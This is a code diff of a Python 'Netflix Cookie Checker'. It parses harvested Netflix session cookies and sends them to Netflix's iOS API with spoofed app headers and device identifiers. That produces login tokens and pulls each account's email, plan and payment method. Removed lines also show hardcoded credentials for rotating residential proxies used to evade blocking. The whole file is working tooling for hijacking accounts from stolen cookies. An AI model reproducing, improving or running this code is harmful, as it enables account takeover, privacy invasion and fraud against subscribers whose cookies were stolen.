@@ -3,7 +3,7 @@
 
 """
 Rumman Checker - Netflix Cookie Checker
-Vercel-compatible version with rotating residential proxies
+Vercel-compatible version using Dora Bot's working logic
 """
 
 import os
@@ -22,46 +22,28 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ============================================
-# RESIDENTIAL PROXIES (Webshare)
-# ============================================
-
-PROXY_LIST = [
-    "http://mfaqlivy:ar91rt230oyo@31.59.20.176:6754",
-    "http://mfaqlivy:ar91rt230oyo@31.56.127.193:7684",
-    "http://mfaqlivy:ar91rt230oyo@45.38.107.97:6014",
-    "http://mfaqlivy:ar91rt230oyo@198.105.121.200:6462",
-    "http://mfaqlivy:ar91rt230oyo@64.137.96.74:6641",
-    "http://mfaqlivy:ar91rt230oyo@198.23.243.226:6361",
-    "http://mfaqlivy:ar91rt230oyo@38.154.185.97:6370",
-    "http://mfaqlivy:ar91rt230oyo@84.247.60.125:6095",
-    "http://mfaqlivy:ar91rt230oyo@142.111.67.146:5611",
-    "http://mfaqlivy:ar91rt230oyo@191.96.254.138:6185",
-]
-
-# Randomize proxy order
-random.shuffle(PROXY_LIST)
-
-# ============================================
-
 DEBUG = True
 
-MEMBERSHIP_URL = "https://www.netflix.com/account/membership"
-YOUR_ACCOUNT_URL = "https://www.netflix.com/YourAccount"
+# ============================================
+# CONSTANTS (from your bot)
+# ============================================
 
-# ==================================================
-# UTILITIES
-# ==================================================
+NETFLIX_MEMBERSHIP_URL = "https://www.netflix.com/account/membership"
+NETFLIX_YOUR_ACCOUNT = "https://www.netflix.com/YourAccount"
 
-def decode_value(value: Any) -> Optional[str]:
+# ============================================
+# UTILITIES (from your bot)
+# ============================================
+
+def decode_value(value):
     if value is None:
         return None
-    cleaned = str(value)
-    cleaned = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), cleaned)
-    cleaned = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), cleaned)
-    cleaned = cleaned.replace('\\/', '/').replace('\\"', '"').replace('\\n', ' ').replace('\\t', ' ')
-    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
-    return cleaned if cleaned else None
+    value = str(value)
+    value = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), value)
+    value = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), value)
+    value = value.replace('\\/', '/').replace('\\"', '"').replace('\\n', ' ').replace('\\t', ' ')
+    value = re.sub(r'\s+', ' ', value).strip()
+    return value if value else None
 
 def clean_phone_number(phone: str) -> str:
     if not phone:
@@ -72,13 +54,14 @@ def clean_phone_number(phone: str) -> str:
         return f"+{digits}"
     return digits
 
-# ==================================================
-# COOKIE PARSING
-# ==================================================
+# ============================================
+# COOKIE PARSING (from your bot)
+# ============================================
 
 def extract_cookie_bundles(content: str) -> List[Tuple[Dict[str, str], str, Dict[str, Any]]]:
     bundles = []
     
+    # Try JSON format
     try:
         data = json.loads(content)
         if isinstance(data, list):
@@ -111,6 +94,7 @@ def extract_cookie_bundles(content: str) -> List[Tuple[Dict[str, str], str, Dict
     except:
         pass
     
+    # Try Netscape format
     if not bundles:
         blocks = re.split(r'\n\s*\n', content.strip())
         for block in blocks:
@@ -135,6 +119,7 @@ def extract_cookie_bundles(content: str) -> List[Tuple[Dict[str, str], str, Dict
             if 'NetflixId' in cookies:
                 bundles.append((cookies, "\n".join(netscape_lines), {}))
     
+    # Try raw cookie values
     if not bundles:
         cookies = {}
         netscape_lines = []
@@ -152,11 +137,74 @@ def extract_cookie_bundles(content: str) -> List[Tuple[Dict[str, str], str, Dict
     
     return bundles
 
-# ==================================================
-# NFTOKEN GENERATION - WITH ROTATING PROXIES
-# ==================================================
+# ============================================
+# ACCOUNT INFO EXTRACTION (from your bot)
+# ============================================
+
+def extract_account_info(response_text: str) -> Dict:
+    info = {
+        "countryOfSignup": None,
+        "membershipStatus": None,
+        "localizedPlanName": None,
+        "maxStreams": None,
+        "videoQuality": None,
+        "holdStatus": None,
+        "paymentMethod": None,
+        "email": None,
+        "accountOwnerName": None,
+        "plan": None,
+        "memberSince": None,
+        "nextBillingDate": None,
+        "planPrice": None,
+    }
+    
+    # Extract email
+    email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', response_text)
+    if not email_match:
+        email_match = re.search(r'"email"\s*:\s*"([^"]+)"', response_text)
+    if email_match:
+        info["email"] = decode_value(email_match.group(1))
+    
+    # Extract country
+    country_match = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', response_text)
+    if not country_match:
+        country_match = re.search(r'"countryOfSignup":\s*"([^"]+)"', response_text)
+    if country_match:
+        info["countryOfSignup"] = decode_value(country_match.group(1))
+    
+    # Extract plan
+    plan_match = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', response_text)
+    if plan_match:
+        plan_name = decode_value(plan_match.group(1))
+        info["localizedPlanName"] = plan_name
+        if plan_name:
+            plan_lower = plan_name.lower()
+            if "premium" in plan_lower:
+                info["plan"] = "Premium"
+            elif "standard" in plan_lower:
+                info["plan"] = "Standard"
+            elif "basic" in plan_lower:
+                info["plan"] = "Basic"
+            else:
+                info["plan"] = plan_name
+    
+    # Extract payment method
+    payment_match = re.search(r'"paymentMethodType":\s*"([^"]+)"', response_text)
+    if payment_match:
+        info["paymentMethod"] = decode_value(payment_match.group(1))
+    if not info.get("paymentMethod"):
+        display_match = re.search(r'"displayText":\s*"([^"]+)"', response_text)
+        if display_match:
+            info["paymentMethod"] = decode_value(display_match.group(1))
+    
+    return info
+
+# ============================================
+# MAIN TOKEN GENERATION (COPY OF YOUR BOT'S LOGIC)
+# ============================================
 
 def create_nftoken(cookies: Dict[str, str]) -> Optional[Dict]:
+    """Generate token using the EXACT same logic as your Discord bot"""
     netflix_id = cookies.get('NetflixId')
     if not netflix_id:
         print("❌ No NetflixId found in cookies")
@@ -164,126 +212,106 @@ def create_nftoken(cookies: Dict[str, str]) -> Optional[Dict]:
     
     print(f"🔄 Requesting NFToken for NetflixId: {netflix_id[:30]}...")
     
-    # Try each proxy until one works
-    for i, proxy_url in enumerate(PROXY_LIST):
-        print(f"🔄 Trying proxy {i+1}/{len(PROXY_LIST)}: {proxy_url.split('@')[-1]}")
-        
-        try:
-            token = get_token_via_api(netflix_id, proxy_url)
-            if token:
-                expires = datetime.now(timezone.utc) + timedelta(hours=1)
-                return {
-                    'token': token,
-                    'expires_at_utc': expires.strftime("%Y-%m-%d %H:%M:%S UTC"),
-                    'proxy_used': proxy_url.split('@')[-1]
-                }
-        except Exception as e:
-            print(f"⚠️ Proxy {i+1} failed: {e}")
-            continue
-    
-    return None
-
-def get_token_via_api(netflix_id: str, proxy_url: str) -> Optional[str]:
-    """Get token via the iOS API with a specific proxy"""
-    
-    # Clean the NetflixId
-    if netflix_id.startswith('v%3D3%26ct%3D'):
-        pass
-    elif 'ct%3D' in netflix_id:
-        match = re.search(r'ct%3D([^&%]+)', netflix_id)
-        if match:
-            netflix_id = 'v%3D3%26ct%3D' + match.group(1)
-    
-    headers = {
-        'User-Agent': 'Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)',
-        'Accept': 'application/json',
-        'Accept-Language': 'en-US;q=1',
-        'x-netflix.request.attempt': '1',
-        'x-netflix.context.profile-guid': 'A4CS633D7VCBPE2GPK2HL4EKOE',
-        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
-        'x-netflix.context.app-version': '15.48.1',
-        'x-netflix.argo.translated': 'true',
-        'x-netflix.context.form-factor': 'phone',
-        'x-netflix.context.sdk-version': '2012.4',
-        'x-netflix.client.appversion': '15.48.1',
-        'x-netflix.context.max-device-width': '375',
-        'x-netflix.client.type': 'argo',
-        'x-netflix.client.ftl.esn': 'NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
-        'x-netflix.context.locales': 'en-US',
-        'x-netflix.client.iosversion': '15.8.5',
-        'x-netflix.argo.abtests': '',
-        'x-netflix.context.os-version': '15.8.5',
-        'x-netflix.context.ui-flavor': 'argo',
-        'x-netflix.argo.nfnsm': '9',
-        'x-netflix.context.pixel-density': '2.0',
-        'Cookie': f'NetflixId={netflix_id}'
-    }
+    # This is the EXACT URL and params from your bot
+    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
     
     params = {
-        'appVersion': '15.48.1',
-        'config': '{"gamesInTrailersEnabled":"false"}',
-        'device_type': 'NFAPPL-02-',
-        'esn': 'NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
-        'idiom': 'phone',
-        'iosVersion': '15.8.5',
-        'isTablet': 'false',
-        'languages': 'en-US',
-        'locale': 'en-US',
-        'maxDeviceWidth': '375',
-        'model': 'saget',
-        'modelType': 'IPHONE8-1',
-        'odpAware': 'true',
-        'path': '["account","token","default"]',
-        'pathFormat': 'graph',
-        'pixelDensity': '2.0',
-        'progressive': 'false',
-        'responseFormat': 'json',
+        "appVersion": "15.48.1",
+        "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
+        "device_type": "NFAPPL-02-",
+        "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+        "idiom": "phone",
+        "iosVersion": "15.8.5",
+        "isTablet": "false",
+        "languages": "en-US",
+        "locale": "en-US",
+        "maxDeviceWidth": "375",
+        "model": "saget",
+        "modelType": "IPHONE8-1",
+        "odpAware": "true",
+        "path": '["account","token","default"]',
+        "pathFormat": "graph",
+        "pixelDensity": "2.0",
+        "progressive": "false",
+        "responseFormat": "json",
     }
     
-    proxies = {
-        'http': proxy_url,
-        'https': proxy_url,
+    # EXACT headers from your bot
+    headers = {
+        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
+        "x-netflix.request.attempt": "1",
+        "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
+        "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
+        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
+        "x-netflix.context.app-version": "15.48.1",
+        "x-netflix.argo.translated": "true",
+        "x-netflix.context.form-factor": "phone",
+        "x-netflix.context.sdk-version": "2012.4",
+        "x-netflix.client.appversion": "15.48.1",
+        "x-netflix.context.max-device-width": "375",
+        "x-netflix.context.ab-tests": "",
+        "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
+        "x-netflix.client.type": "argo",
+        "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+        "x-netflix.context.locales": "en-US",
+        "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
+        "x-netflix.client.iosversion": "15.8.5",
+        "accept-language": "en-US;q=1",
+        "x-netflix.argo.abtests": "",
+        "x-netflix.context.os-version": "15.8.5",
+        "x-netflix.request.client.context": '{"appState":"foreground"}',
+        "x-netflix.context.ui-flavor": "argo",
+        "x-netflix.argo.nfnsm": "9",
+        "x-netflix.context.pixel-density": "2.0",
+        "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
+        "x-netflix.request.client.timezoneid": "Asia/Dhaka",
+        "Cookie": f"NetflixId={netflix_id}"
     }
     
     try:
-        response = requests.get(
-            'https://ios.prod.ftl.netflix.com/iosui/user/15.48',
-            params=params,
-            headers=headers,
-            proxies=proxies,
-            timeout=12,
-            verify=False
-        )
-        
+        response = requests.get(url, params=params, headers=headers, timeout=15, verify=False)
         print(f"📡 API Status: {response.status_code}")
         
-        if response.status_code == 200:
-            data = response.json()
-            token_data = (((data.get('value') or {}).get('account') or {}).get('token') or {}).get('default') or {}
-            token = token_data.get('token')
-            if token:
-                print(f"✅ Token generated! Length: {len(token)}")
-                return token
-            else:
-                print("⚠️ No token in response")
-        elif response.status_code == 403:
-            print("❌ Access denied - proxy blocked by Netflix")
-        elif response.status_code == 429:
-            print("❌ Rate limited")
-        else:
+        if response.status_code != 200:
             print(f"❌ API returned: {response.status_code}")
-                
+            return None
+        
+        data = response.json()
+        
+        token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
+        token = token_data.get("token")
+        expires = token_data.get("expires")
+        
+        if not token:
+            print("⚠️ No token in response")
+            return None
+        
+        print(f"✅ Token generated! Length: {len(token)}")
+        
+        if isinstance(expires, int) and len(str(expires)) == 13:
+            expires //= 1000
+        
+        expires_str = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S UTC") if expires else None
+        
+        return {
+            'token': token,
+            'expires_at_utc': expires_str,
+            'expires_timestamp': expires
+        }
+        
     except requests.exceptions.Timeout:
         print("❌ Request timed out")
-    except requests.exceptions.ProxyError as e:
-        print(f"❌ Proxy error: {e}")
+        return None
     except Exception as e:
         print(f"❌ Error: {e}")
-    
-    return None
+        return None
+
+# ============================================
+# VERCEL ENTRY POINT
+# ============================================
 
 def generate_token_from_cookie(cookie_content: str) -> Optional[Dict]:
-    """Generate token from cookie content"""
+    """Generate token from cookie content using your bot's logic"""
     bundles = extract_cookie_bundles(cookie_content)
     print(f"📦 Found {len(bundles)} cookie bundles")
     
@@ -296,8 +324,7 @@ def generate_token_from_cookie(cookie_content: str) -> Optional[Dict]:
                     'token': token_data.get('token'),
                     'expires_at_utc': token_data.get('expires_at_utc'),
                     'cookies': cookies,
-                    'info': info,
-                    'proxy_used': token_data.get('proxy_used', 'unknown')
+                    'info': info
                 }
     
     return None
